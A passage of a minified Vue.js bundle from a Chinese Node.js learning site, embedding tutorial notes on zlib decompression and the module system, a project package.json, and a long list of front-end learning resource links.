执行完以上操作后，我们可以看到当前目录下生成了 input.txt 的压缩文件 input.txt.gz。\r\n\t\t\t  - 接下来，让我们来解压该文件，创建 decompress.js 文件，代码如下：\r\n\t\t\t  \r\n\t\t\t  \t- var fs = require(\"fs\");\r\n\t\t\t  ```\r\n\t\t\t  \r\n\t\t\t  var zlib = require('zlib');\r\n\t\t\t  \r\n\t\t\t  // 解压 input.txt.gz 文件为 input.txt\r\n\t\t\t  fs.createReadStream('input.txt.gz')\r\n\t\t\t  .pipe(zlib.createGunzip())\r\n\t\t\t  .pipe(fs.createWriteStream('input.txt'));\r\n\t\t\t  \r\n\t\t\t  console.log(\"文件解压完成。\");\r\n\t\t\t  \r\n\t\t\t  ``` null\r\n\t\t\t  - 代码执行结果如下：\r\n\t\t\t  \r\n\t\t\t  \t- $ node decompress.js \r\n\t\t\t  ```\r\n\t\t\t  \r\n\t\t\t  文件解压完成。\r\n\t\t\t  \r\n\t\t\t  \r\n\r\n- Node.js 模块系统\r\n\r\n\t- 概述\r\n\r\n\t\t- 为了让Node.js的文件可以相互调用，Node.js提供了一个简单的模块系统。\r\n\t\t- 模块是Node.js 应用程序的基本组成部分，文件和模块是一一对应的。\r\n换言之，一个 Node.js 文件就是一个模块，这个文件可能是JavaScript 代码、JSON 或者编译过的C/C++ 扩展。\r\n\r\n\t- 创建模块\r\n\r\n\t\t- 在 Node.js 中，创建一个模块非常简单，如下我们创建一个 'main.js' 文件，代码如下:\r\n\r\n\t\t\t- var hello = require('./hello');\r\nhello.world();\r\n\r\n\t\t\t  以上实例中，代码 require('./hello') 引入了当前目录下的hello.js文件（./ 为当前目录，node.js默认后缀为js）。\r\n\t\t\t  \r\n\t\t\t  ``` null\r\n\t\t\t  \t- Node.js 提供了exports 和 require 两个对象，其中 exports 是模块公开的接口，require 用于从外部获取一个模块的接口，即所获取模块的 exports 对象。\r\n\t\t\t  \r\n\t\t\t  \t\t- 接下来我们就来创建hello.js文件，代码如下\r\n\t\t\t  \r\n\t\t\t  \t\t\t- exports.world = function() {\r\n\t\t\t  ```\r\n\t\t\t  \r\n\t\t\t  console.log('Hello World');\r\n\t\t\t  }\r\n\t\t\t  \r\n\t\t\t  ``` null\r\n\t\t\t  \t\t\t\t- 有时候我们只是想把一个对象封装到模块中，格式如下：\r\n\t\t\t  \r\n\t\t\t  \t\t\t\t\t- module.exports = function() {\r\n\t\t\t  ```\r\n\t\t\t  \r\n\t\t\t  // ...\r\n\t\t\t  }\r\n\t\t\t  \r\n\t\t\t  ``` null\r\n\t\t\t  \t\t\t\t\t\t- //hello.js \r\n\t\t\t  ```\r\n\t\t\t  \r\n\t\t\t  function Hello() {\r\n\t\t\t  var name;\r\n\t\t\t  this.setName = function(thyName) {\r\n\t\t\t  name = thyName;\r\n\t\t\t  };\r\n\t\t\t  this.sayHello = function() {\r\n\t\t\t  console.log('Hello ' + name);\r\n\t\t\t  };\r\n\t\t\t  };\r\n\t\t\t  module.exports = Hello;\r\n\t\t\t  \r\n\t\t\t  ``` null\r\n\t\t\t  \t\t\t\t\t\t\t- 这样就可以直接获得这个对象了：\r\n\t\t\t  \r\n\t\t\t  \t\t\t\t\t\t\t\t- //main.js \r\n\t\t\t  ```\r\n\t\t\t  \r\n\t\t\t  var Hello = require('./hello');\r\n\t\t\t  hello = new Hello();\r\n\t\t\t  hello.setName('BYVoid');\r\n\t\t\t  hello.sayHello();\r\n\t\t\t  \r\n\t\t\t  ``` null\r\n\t\t\t  \t\t\t\t\t\t\t\t\t- 模块接口的唯一变化是使用 module.exports = Hello 代替了exports.world = function(){}。 在外部引用该模块时，其接口对象就是要输出的 Hello 对象本身，而不是原先的 exports。\r\n\t\t\t  ```\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t\t  \r\n\t\t\t  \r\n\r\n",l={data:function(){return{MainComponent:o}}},c=l,p=t("2877"),u=Object(p["a"])(c,i,s,!1,null,"1dcf4475",null),m=u.exports,d=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},g=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v("           "),t("code",[n._v('\n\n           \n{\n  "name": "node-web-fullstack",\n  "version": "0.0.1",\n  "description": "锦年node全栈学习项目",\n  "productName": "锦年fullstack",\n  "author": "jinnianwushuang ",\n  "private": true,\n  "main": "server.js",\n  "apidoc":{\n    "name": "锦年node全栈学习项目API",\n    "version": "0.1.0",\n    "description": "明日复明日，万事成蹉跎。",\n    "title": "锦年node全栈学习项目API",\n    "url": "http://192.168.0.36:19090"\n  },\n  "scripts": {\n    "test": "echo \\"No test specified\\" && exit 0",\n    "start-makedoc": "apidoc -i app/ -o apidoc/",\n    "start-docpage": " http-server ./apidoc -a 192.168.0.36 -p 19092 -s -o ",\n    "start-docpage-b": "http-server ./apidoc -a 192.168.0.36 -p 19092 -s -o ",\n    "start-server": "nodemon --harmony  server.js",\n    "start-webpage": "quasar dev",\n    "start-doc-s": "run-s start-makedoc start-docpage",\n    "start-fullstack-p": "run-p  start-server  start-webpage",\n    "init-env": "node init.js",\n    "start": "run-s  init-env   start2",\n    "start2": "run-p   start-fullstack-p start-doc-s"\n  },\n  "dependencies": {\n    "@quasar/extras": "^1.0.0",\n    "axios": "^0.18.1",\n    "body-parser": "^1.19.0",\n    "core-js": "^3.6.5",\n    "cors": "^2.8.5",\n    "express": "^4.17.1",\n    "lodash": "^4.17.20",\n    "log4js": "^6.3.0",\n    "md5": "^2.3.0",\n    "mongoose": "^5.8.10",\n    "mongoose-paginate-v2": "^1.3.9",\n    "quasar": "^1.0.0",\n    "vue-i18n": "^8.0.0"\n  },\n  "devDependencies": {\n    "@quasar/app": "^2.0.0",\n    "apidoc": "^0.25.0",\n    "http-server": "^0.12.3",\n    "nodemon": "^2.0.4",\n    "npm-run-all": "^4.1.5"\n  },\n  "browserslist": [\n    "ie >= 11",\n    "last 10 Chrome versions",\n    "last 10 Firefox versions",\n    "last 4 Edge versions",\n    "last 7 Safari versions",\n    "last 8 Android versions",\n    "last 8 ChromeAndroid versions",\n    "last 8 FirefoxAndroid versions",\n    "last 10 iOS versions",\n    "last 5 Opera versions"\n  ],\n  "engines": {\n    "node": ">= 10.18.1",\n    "npm": ">= 6.13.4",\n    "yarn": ">= 1.21.1"\n  }\n}\n\n')]),n._v("\n       ")])])}],b={},v=b,h=Object(p["a"])(v,d,g,!1,null,"6454dfc7",null),S=h.exports,y=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},f=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("div",[n._v(" node 项目 遇到的坑")]),t("div",[t("ul",[t("li",[n._v("linux 部署 node 项目  后台运行 需要两次回车 ，第一次 退出 node 项目界面 ，第二次 才是背后运行")]),t("li",[n._v("nohup  ,  后缀 $  ， forever start xxxxx,  node  ./server.js")])])])])}],_={components:{},data:function(){return{}}},x=_,w=Object(p["a"])(x,y,f,!1,null,"f1af0aa4",null),E=w.exports,T=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},k=[],C={},j=C,M=Object(p["a"])(j,T,k,!1,null,"a7c14b9c",null),R=M.exports,L=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},O=[],A={},I=A,D=Object(p["a"])(I,L,O,!1,null,"fba97d1a",null),P=D.exports,N=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},q=[],H={},B=H,F=Object(p["a"])(B,N,q,!1,null,"583728b4",null),U=F.exports,J=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("json-api-viewer",{attrs:{title:"QPdfviewer API",json:n.json}})],1)},z=[],W=t("c533"),$={data:function(){return{json:W}}},G=$,V=Object(p["a"])(G,J,z,!1,null,"172c1d70",null),Q=V.exports,K=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},X=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("p",[n._v("综合类")]),t("p",[n._v("综合类 地址")]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/sb19871023/p/3894452.html",target:"_blank"}},[n._v("前端知识体系")])]),t("p",[t("a",{attrs:{href:"https://github.com/JacksonTian/fks",target:"_blank"}},[n._v("前端知识结构")])]),t("p",[t("a",{attrs:{href:"https://github.com/unruledboy/WebFrontEndStack",target:"_blank"}},[n._v("Web前端开发大系概览")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/unruledboy/p/WebFrontEndStack.html",target:"_blank"}},[n._v("Web前端开发大系概览-中文版")])]),t("p",[n._v("Web Front-end Stack v2.2 Web Front-end Stack v2.2")]),t("p",[t("a",{attrs:{href:"https://github.com/justjavac/free-programming-books-zh_CN",target:"_blank"}},[n._v("免费的编程中文书籍索引")])]),t("p",[t("a",{attrs:{href:"https://github.com/dypsilon/frontend-dev-bookmarks",target:"_blank"}},[n._v("前端书籍")])]),t("p",[t("a",{attrs:{href:"https://github.com/vhf/free-programming-books",target:"_blank"}},[n._v("前端免费书籍大全")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/sb19871023/p/3894452.html",target:"_blank"}},[n._v("前端知识体系")])]),t("p",[t("a",{attrs:{href:"https://github.com/justjavac/free-programming-books-zh_CN",target:"_blank"}},[n._v("免费的编程中文书籍索引")])]),t("p",[t("a",{attrs:{href:"http://study.163.com/course/introduction/224014.htm",target:"_blank"}},[n._v("智能社 - 精通JavaScript开发")])]),t("p",[t("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/A_re-introduction_to_JavaScript",target:"_blank"}},[n._v("重新介绍 JavaScript（JS 教程）")])]),t("p",[t("a",{attrs:{href:"http://v.163.com/special/opencourse/bianchengdaolun.html",target:"_blank"}},[n._v("麻省理工学院公开课：计算机科学及编程导论")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000002640298",target:"_blank"}},[n._v("JavaScript中的this陷阱的最全收集--没有之一")])]),t("p",[t("a",{attrs:{href:"https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/ch1.html",target:"_blank"}},[n._v("JS函数式编程指南")])]),t("p",[t("a",{attrs:{href:"http://liubin.github.io/promises-book",target:"_blank"}},[n._v("JavaScript Promise迷你书（中文版）")])]),t("p",[t("a",{attrs:{href:"https://github.com/AlloyTeam/Mars",target:"_blank"}},[n._v("腾讯移动Web前端知识库")])]),t("p",[t("a",{attrs:{href:"https://github.com/Front-End-Developers-Hunan/Front-End-Develop-Guide",target:"_blank"}},[n._v("Front-End-Develop-Guide 前端开发指南")])]),t("p",[t("a",{attrs:{href:"https://li-xinyang.gitbooks.io/frontend-notebook/content",target:"_blank"}},[n._v("前端开发笔记本")])]),t("p",[t("a",{attrs:{href:"https://github.com/nieweidong/fetool",target:"_blank"}},[n._v("大前端工具集 - 聂微东")])]),t("p",[t("a",{attrs:{href:"https://dwqs.gitbooks.io/frontenddevhandbook/content",target:"_blank"}},[n._v("前端开发者手册")])]),t("p",[n._v("入门类")]),t("p",[n._v("入门类 地址")]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/jikey/p/3613082.html",target:"_blank"}},[n._v("前端入门教程")])]),t("p",[t("a",{attrs:{href:"http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000",target:"_blank"}},[n._v("瘳雪峰的Javascript教程")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/view/11",target:"_blank"}},[n._v("jQuery基础教程")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/view/506",target:"_blank"}},[n._v("前端工程师必备的PS技能——切图篇")])]),t("p",[t("a",{attrs:{href:"https://github.com/qiu-deqing/FE-learning",target:"_blank"}},[n._v("结合个人经历总结的前端入门方法")])]),t("p",[n._v("工具类")]),t("p",[n._v("工具类 地址")]),t("p",[t("a",{attrs:{href:"http://f2er.club/",target:"_blank"}},[n._v("前端人的俱乐部")])]),t("p",[t("a",{attrs:{href:"http://www.jeffjade.com/2015/12/15/2015-04-17-toss-sublime-text/#",target:"_blank"}},[n._v("如何优雅地使用Sublime\n                    Text")])]),t("p",[t("a",{attrs:{href:"http://www.jeffjade.com/2016/03/03/2016-03-02-how-to-use-atom/",target:"_blank"}},[n._v("新编码神器Atom使用纪要")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/learn/93",target:"_blank"}},[n._v("css sprite 雪碧图制作")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/learn/390",target:"_blank"}},[n._v("版本控制入门 – 搬进 Github")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/learn/30",target:"_blank"}},[n._v("Grunt-beginner前端自动化工具")])]),t("p",[t("a",{attrs:{href:"https://github.com/judasn/IntelliJ-IDEA-Tutorial",target:"_blank"}},[n._v("IntelliJ IDEA 简体中文专题教程")])]),t("p",[t("a",{attrs:{href:"http://t.cn/8kZZ1Uy",target:"_blank"}},[n._v("Webstorm,InterllIdea,Phpstorm")])]),t("p",[t("a",{attrs:{href:"https://github.com/jikeytang/sublime-text",target:"_blank"}},[n._v("SublimeText")])]),t("p",[t("a",{attrs:{href:"https://atom.io",target:"_blank"}},[n._v("Atom")])]),t("p",[t("a",{attrs:{href:"https://code.visualstudio.com",target:"_blank"}},[n._v("visual studio code")])]),t("p",[n._v("综合效果搜索平台")]),t("p",[n._v("综合效果搜索平台 地址")]),t("p",[t("a",{attrs:{href:"http://zoommyapp.com/",target:"_blank"}},[n._v("zoommyapp.com")])]),t("p",[t("a",{attrs:{href:"https://unsplash.com/",target:"_blank"}},[n._v("unsplash.com")])]),t("p",[t("a",{attrs:{href:"https://www.pinterest.com/",target:"_blank"}},[n._v("www.pinterest.com")])]),t("p",[t("a",{attrs:{href:"http://nos.twnsnd.co",target:"_blank"}},[n._v("New Old Stock")])]),t("p",[t("a",{attrs:{href:"http://www.jq22.com",target:"_blank"}},[n._v("效果网")])]),t("p",[t("a",{attrs:{href:"http://huaban.com/",target:"_blank"}},[n._v("花瓣网")])]),t("p",[t("a",{attrs:{href:"http://www.topit.me/",target:"_blank"}},[n._v("优美图")])]),t("p",[t("a",{attrs:{href:"http://codepen.io/",target:"_blank"}},[n._v("codepen")])]),t("p",[t("a",{attrs:{href:"http://www.17sucai.com",target:"_blank"}},[n._v("17素材")])]),t("p",[t("a",{attrs:{href:"http://699pic.com/",target:"_blank"}},[n._v("摄图网")])]),t("p",[t("a",{attrs:{href:"http://microjs.com",target:"_blank"}},[n._v("常用的JavaScript代码片段")])]),t("p",[n._v("周报类")]),t("p",[n._v("周报类 地址")]),t("p",[t("a",{attrs:{href:"http://old.75team.com/weekly/",target:"_blank"}},[n._v("奇舞周刊")])]),t("p",[t("a",{attrs:{href:"http://weekly.manong.io",target:"_blank"}},[n._v("码农周刊")])]),t("p",[t("a",{attrs:{href:"http://www.kancloud.cn/jsfront/month/82796",target:"_blank"}},[n._v("JS前端开发群月报")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com",target:"_blank"}},[n._v("WEB前端开发")])]),t("p",[t("a",{attrs:{href:"http://www.jstips.co",target:"_blank"}},[n._v("A JS tip per day!")])]),t("p",[t("a",{attrs:{href:"https://github.com/PaicHyperionDev/MobileDevWeekly",target:"_blank"}},[n._v("平安科技移动开发二队技术周报")])]),t("p",[n._v("开发中心")]),t("p",[n._v("开发中心 地址")]),t("p",[t("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript",target:"_blank"}},[n._v("mozilla js参考")])]),t("p",[t("a",{attrs:{href:"https://developer.chrome.com/extensions/api_index.html",target:"_blank"}},[n._v("chrome开发中心（chrome的内核已转向blink）")])]),t("p",[t("a",{attrs:{href:"https://developer.apple.com/library/safari/navigation",target:"_blank"}},[n._v("safari开发中心")])]),t("p",[t("a",{attrs:{href:"https://msdn.microsoft.com/zh-cn/library/d1et7k7c",target:"_blank"}},[n._v("microsoft js参考")])]),t("p",[t("a",{attrs:{href:"http://sanshi.me/articles/JavaScript-Garden-CN/html/index.html",target:"_blank"}},[n._v("js秘密花园")])]),t("p",[t("a",{attrs:{href:"http://bonsaiden.github.io/JavaScript-Garden/zh",target:"_blank"}},[n._v("js秘密花园")])]),t("p",[t("a",{attrs:{href:"http://www.w3help.org",target:"_blank"}},[n._v("w3help")])]),t("p",[n._v("Nodejs")]),t("p",[n._v("Nodejs 地址")]),t("p",[t("a",{attrs:{href:"http://liuqing.pw",target:"_blank"}},[n._v("nodejs 篇幅比较巨大")])]),t("p",[t("a",{attrs:{href:"https://github.com/alsotang/node-lessons",target:"_blank"}},[n._v("Node.js 包教不包会")])]),t("p",[t("a",{attrs:{href:"http://www.rainweb.cn/article/category/Nodejs",target:"_blank"}},[n._v("篇幅比较少")])]),t("p",[t("a",{attrs:{href:"http://www.w3cfuns.com/article-5598538-1-1.html",target:"_blank"}},[n._v("node express 入门教程")])]),t("p",[t("a",{attrs:{href:"http://my.oschina.net/u/568264/blog/193773",target:"_blank"}},[n._v("nodejs定时任务")])]),t("p",[t("a",{attrs:{href:"http://60sky.com",target:"_blank"}},[n._v("一个nodejs博客")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/yexiaochai/p/3536547.html",target:"_blank"}},[n._v("【NodeJS 学习笔记04】新闻发布系统")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/qqloving/p/3541099.html",target:"_blank"}},[n._v("过年7天乐，学nodejs 也快乐")])]),t("p",[t("a",{attrs:{href:"https://github.com/nqdeng/7-days-nodejs",target:"_blank"}},[n._v("七天学会NodeJS")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/zhongweiv/p/nodejs_events.html",target:"_blank"}},[n._v("Nodejs学习笔记（二）--- 事件模块")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/liusuqi/p/3735491.html",target:"_blank"}},[n._v("nodejs入门")])]),t("p",[t("a",{attrs:{href:"https://github.com/zensh/jsgen",target:"_blank"}},[n._v("angularjs nodejs")])]),t("p",[t("a",{attrs:{href:"http://blog.fens.me/series-nodejs",target:"_blank"}},[n._v("从零开始nodejs系列文章")])]),t("p",[t("a",{attrs:{href:"http://debuggable.com/posts/understanding-node-js:4bd98440-45e4-4a9a-8ef7-0f7ecbdd56cb",target:"_blank"}},[n._v("理解nodejs")])]),t("p",[t("a",{attrs:{href:"http://blog.mixu.net/2011/02/01/understanding-the-node-js-event-loop",target:"_blank"}},[n._v("nodejs事件轮询")])]),t("p",[t("a",{attrs:{href:"http://www.nodebeginner.org/index-zh-cn.html",target:"_blank"}},[n._v("node入门")])]),t("p",[t("a",{attrs:{href:"http://ourjs.com/detail/53e1f281c5910a9806000001",target:"_blank"}},[n._v("nodejs cms")])]),t("p",[t("a",{attrs:{href:"http://ourjs.com/detail/529ca5950cb6498814000005",target:"_blank"}},[n._v("Node初学者入门，一本全面的NodeJS教程")])]),t("p",[t("a",{attrs:{href:"http://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line",target:"_blank"}},[n._v("NodeJS的代码调试和性能调优")])]),t("p",[n._v("综合API")]),t("p",[n._v("综合API 地址")]),t("p",[t("a",{attrs:{href:"http://www.javascripting.com",target:"_blank"}},[n._v("javascripting")])]),t("p",[t("a",{attrs:{href:"http://microjs.com",target:"_blank"}},[n._v("各种流行库搜索")])]),t("p",[t("a",{attrs:{href:"http://www.runoob.com",target:"_blank"}},[n._v("runoob.com-包含各种API集合")])]),t("p",[t("a",{attrs:{href:"http://tool.oschina.net/apidocs",target:"_blank"}},[n._v("开源中国在线API文档合集")])]),t("p",[t("a",{attrs:{href:"http://devdocs.io",target:"_blank"}},[n._v("devdocs")])]),t("p",[n._v("Ecmascript")]),t("p",[n._v("Ecmascript 地址")]),t("p",[t("a",{attrs:{href:"https://leanpub.com/understandinges6/read",target:"_blank"}},[n._v("Understanding ECMAScript 6 - Nicholas C.\n                    Zakas")])]),t("p",[t("a",{attrs:{href:"https://leanpub.com/exploring-es6/read",target:"_blank"}},[n._v("exploring-es6")])]),t("p",[t("a",{attrs:{href:"https://github.com/es6-org/exploring-es6",target:"_blank"}},[n._v("exploring-es6翻译")])]),t("p",[t("a",{attrs:{href:"http://es6-org.github.io/exploring-es6",target:"_blank"}},[n._v("exploring-es6翻译后预览")])]),t("p",[t("a",{attrs:{href:"http://es6.ruanyifeng.com",target:"_blank"}},[n._v("阮一峰 es6")])]),t("p",[t("a",{attrs:{href:"http://javascript.ruanyifeng.com",target:"_blank"}},[n._v("阮一峰 Javascript")])]),t("p",[t("a",{attrs:{href:"http://yanhaijing.com/es5",target:"_blank"}},[n._v("ECMA-262，第 5 版")])]),t("p",[t("a",{attrs:{href:"http://es5.github.io",target:"_blank"}},[n._v("es5")])]),t("p",[n._v("Js template")]),t("p",[n._v("Js template 地址")]),t("p",[t("a",{attrs:{href:"http://garann.github.io/template-chooser",target:"_blank"}},[n._v("template-chooser")])]),t("p",[t("a",{attrs:{href:"https://github.com/aui/artTemplate",target:"_blank"}},[n._v("artTemplate")])]),t("p",[t("a",{attrs:{href:"https://github.com/aui/tmodjs/blob/master/README.md",target:"_blank"}},[n._v("tomdjs")])]),t("p",[t("a",{attrs:{href:"http://juicer.name/docs/docs_zh_cn.html",target:"_blank"}},[n._v("淘宝模板juicer模板")])]),t("p",[t("a",{attrs:{href:"http://koen301.github.io/fxtpl",target:"_blank"}},[n._v("Fxtpl v1.0 繁星前端模板引擎")])]),t("p",[t("a",{attrs:{href:"http://laytpl.layui.com",target:"_blank"}},[n._v("laytpl")])]),t("p",[t("a",{attrs:{href:"https://github.com/mozilla/nunjucks",target:"_blank"}},[n._v("mozilla - nunjucks")])]),t("p",[t("a",{attrs:{href:"https://github.com/PaulGuo/Juicer",target:"_blank"}},[n._v("Juicer")])]),t("p",[t("a",{attrs:{href:"http://akdubya.github.io/dustjs",target:"_blank"}},[n._v("dustjs")])]),t("p",[t("a",{attrs:{href:"http://ecomfe.github.io/etpl",target:"_blank"}},[n._v("etpl")])]),t("p",[n._v("CSS")]),t("p",[n._v("CSS 地址")]),t("p",[t("a",{attrs:{href:"http://tympanus.net/codrops/css_reference",target:"_blank"}},[n._v("CSS 语法参考")])]),t("p",[t("a",{attrs:{href:"http://isux.tencent.com/css3/index.html",target:"_blank"}},[n._v("CSS3动画手册")])]),t("p",[t("a",{attrs:{href:"http://isux.tencent.com/css3/tools.html",target:"_blank"}},[n._v("腾讯css3动画制作工具")])]),t("p",[t("a",{attrs:{href:"http://linxz.github.io/tianyizone",target:"_blank"}},[n._v("志爷css小工具集合")])]),t("p",[t("a",{attrs:{href:"http://www.note12.com/category/blog/2014-6-5/538fe0a9f786f1b7019a4dfb",target:"_blank"}},[n._v("css3 js\n                    移动大杂烩")])]),t("p",[t("a",{attrs:{href:"http://bouncejs.com",target:"_blank"}},[n._v("bouncejs 触摸库")])]),t("p",[t("a",{attrs:{href:"http://fian.my.id/Waves",target:"_blank"}},[n._v("css3 按钮动画")])]),t("p",[t("a",{attrs:{href:"http://daneden.github.io/animate.css",target:"_blank"}},[n._v("animate.css")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com/2015/10/8536",target:"_blank"}},[n._v("全局CSS的终结(狗带 [译]")])]),t("p",[t("a",{attrs:{href:"http://browserhacks.com",target:"_blank"}},[n._v("browserhacks")])]),t("p",[n._v("Angularjs")]),t("p",[n._v("Angularjs 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/dolymood/AngularLearning",target:"_blank"}},[n._v("Angular.js 的一些学习资源")])]),t("p",[t("a",{attrs:{href:"http://angularjs.cn",target:"_blank"}},[n._v("angularjs中文社区")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/xuwenmin888/p/3739096.html",target:"_blank"}},[n._v("Angularjs源码学习")])]),t("p",[t("a",{attrs:{href:"http://www.ifeenan.com/?c=AngularJS",target:"_blank"}},[n._v("Angularjs源码学习")])]),t("p",[t("a",{attrs:{href:"http://angular-ui.github.io/bootstrap",target:"_blank"}},[n._v("angular对bootstrap的封装")])]),t("p",[t("a",{attrs:{href:"https://cnodejs.org/topic/51404e0f069911196d2e3923",target:"_blank"}},[n._v("angularjs + nodejs")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/lvdabao/tag/AngularJs",target:"_blank"}},[n._v("吕大豹 Angularjs")])]),t("p",[t("a",{attrs:{href:"http://www.infoq.com/cn/news/2013/02/angular-web-app",target:"_blank"}},[n._v("AngularJS 最佳实践")])]),t("p",[t("a",{attrs:{href:"http://www.lovelucy.info/angularjs-best-practices.html",target:"_blank"}},[n._v("Angular的一些扩展指令")])]),t("p",[t("a",{attrs:{href:"https://github.com/Pasvaz/bindonce",target:"_blank"}},[n._v("Angular数据绑定原理")])]),t("p",[t("a",{attrs:{href:"https://github.com/angular-ui",target:"_blank"}},[n._v("一些扩展Angular UI组件")])]),t("p",[t("a",{attrs:{href:"http://voidcanvas.com/emberjs-vs-angularjs-performance-testing",target:"_blank"}},[n._v("Ember和AngularJS的性能测试")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/powertoolsteam/p/angularjs-introdection.html",target:"_blank"}},[n._v("带你走近AngularJS -\n                    基本功能介绍")])]),t("p",[t("a",{attrs:{href:"http://angular.duapp.com/docs/guide",target:"_blank"}},[n._v("Angularjs开发指南")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/amosli/p/3710648.html",target:"_blank"}},[n._v("Angularjs学习")])]),t("p",[t("a",{attrs:{href:"http://www.rainweb.cn/article/angularjs-jquery.html",target:"_blank"}},[n._v("不要带着jQuery的思维去学习AngularJS")])]),t("p",[t("a",{attrs:{href:"http://wangjiatao.diandian.com/?tag=angularjs",target:"_blank"}},[n._v("angularjs 学习笔记")])]),t("p",[t("a",{attrs:{href:"http://www.angularjs.cn/T008",target:"_blank"}},[n._v("angularjs 开发指南")])]),t("p",[t("a",{attrs:{href:"https://github.com/jmcunningham/AngularJS-Learning",target:"_blank"}},[n._v("angularjs 英文资料")])]),t("p",[t("a",{attrs:{href:"http://angular-ui.github.io/bootstrap",target:"_blank"}},[n._v("angular bootstrap")])]),t("p",[t("a",{attrs:{href:"https://github.com/opitzconsulting/jquery-mobile-angular-adapter",target:"_blank"}},[n._v("angular jq\n                    mobile")])]),t("p",[t("a",{attrs:{href:"http://mgcrea.github.io/angular-strap",target:"_blank"}},[n._v("angular ui")])]),t("p",[t("a",{attrs:{href:"http://www.tuicool.com/articles/7ZZVr2",target:"_blank"}},[n._v("整合jQuery Mobile+AngularJS经验谈")])]),t("p",[t("a",{attrs:{href:"http://blog.jobbole.com/46589/",target:"_blank"}},[n._v("有jQuery背景，该如何用AngularJS编程思想")])]),t("p",[t("a",{attrs:{href:"http://each.sinaapp.com/angular",target:"_blank"}},[n._v("AngularJS在线教程")])]),t("p",[t("a",{attrs:{href:"http://www.zouyesheng.com/angular.html",target:"_blank"}},[n._v("angular学习笔记")])]),t("p",[n._v("React")]),t("p",[n._v("React 地址")]),t("p",[t("a",{attrs:{href:"http://www.react-china.org",target:"_blank"}},[n._v("react.js 中文论坛")])]),t("p",[t("a",{attrs:{href:"https://facebook.github.io/react/index.html",target:"_blank"}},[n._v("react.js 官方网址")])]),t("p",[t("a",{attrs:{href:"https://facebook.github.io/react/docs/getting-started.html",target:"_blank"}},[n._v("react.js 官方文档")])]),t("p",[t("a",{attrs:{href:"http://material-ui.com/#",target:"_blank"}},[n._v("react.js material UI")])]),t("p",[t("a",{attrs:{href:"http://touchstonejs.io",target:"_blank"}},[n._v("react.js TouchstoneJS UI")])]),t("p",[t("a",{attrs:{href:"http://amazeui.org/react",target:"_blank"}},[n._v("react.js amazeui UI")])]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2015/03/react.html",target:"_blank"}},[n._v("React 入门实例教程 - 阮一峰")])]),t("p",[t("a",{attrs:{href:"http://wiki.jikexueyuan.com/project/react-native",target:"_blank"}},[n._v("React Native 中文版")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/Fakefish%203053",target:"_blank"}},[n._v("Webpack 和 React 小书 - 前端乱炖")])]),t("p",[t("a",{attrs:{href:"https://fakefish.github.io/react-webpack-cookbook",target:"_blank"}},[n._v("Webpack 和 React 小书 - gitbook")])]),t("p",[t("a",{attrs:{href:"https://github.com/webpack/webpack",target:"_blank"}},[n._v("webpack")])]),t("p",[t("a",{attrs:{href:"http://html-js.com/article/3009",target:"_blank"}},[n._v("Webpack，101入门体验")])]),t("p",[t("a",{attrs:{href:"http://html-js.com/article/3113",target:"_blank"}},[n._v("webpack入门教程")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000003499526",target:"_blank"}},[n._v("基于webpack搭建前端工程解决方案探索")])]),t("p",[t("a",{attrs:{href:"http://www.piliyu.com",target:"_blank"}},[n._v("React原创实战视频教程")])]),t("p",[n._v("vue")]),t("p",[n._v("vue 地址")]),t("p",[t("a",{attrs:{href:"http://cn.vuejs.org",target:"_blank"}},[n._v("Vue")])]),t("p",[t("a",{attrs:{href:"http://forum.vuejs.org",target:"_blank"}},[n._v("Vue 论坛")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/aaronjs/p/3660102.html",target:"_blank"}},[n._v("Vue 入门指南")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000411057",target:"_blank"}},[n._v("Vue 的一些资源索引")])]),t("p",[t("a",{attrs:{href:"https://github.com/vuejs/awesome-vue",target:"_blank"}},[n._v("awesome-vue")])]),t("p",[n._v("移动端API")]),t("p",[n._v("移动端API 